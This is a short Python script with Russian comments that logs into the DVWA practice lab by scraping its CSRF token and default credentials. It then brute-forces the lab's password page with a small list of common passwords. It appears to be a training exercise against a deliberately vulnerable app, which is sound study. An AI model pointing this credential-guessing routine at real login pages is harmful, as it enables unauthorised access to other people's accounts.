import requests
import re

base = "http://dvwa.local"
login_url = base + "/login.php"
brute_url = base + "/vulnerabilities/brute/"

session = requests.Session()

#  Получаем страницу логина
r = session.get(login_url)

#  Достаём user_token
token = re.search(r"user_token'\s+value='(.*?)'", r.text)
if not token:
    print("[-] Не удалось найти user_token")
    exit()

user_token = token.group(1)
print("[+] user_token:", user_token)

#  Логинимся в DVWA
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token
}

session.post(login_url, data=login_data)

#  Устанавливаем уровень безопасности
session.cookies.set("security", "low")

print("[+] Cookies после логина:")
for c in session.cookies:
    print(f"    {c.name} = {c.value}")

#  Bruteforce
passwords = [
    "123456",
    "qwerty",
    "admin",
    "password",
    "letmein"
]

for password in passwords:
    params = {
        "username": "admin",
        "password": password,
        "Login": "Login"
    }

    r = session.get(brute_url, params=params)

    if "Welcome to the password protected area" in r.text:
        print(f"\n[+] ПАРОЛЬ НАЙДЕН: {password}")
        break
    else:
        print(f"[-] Неверный пароль: {password}")


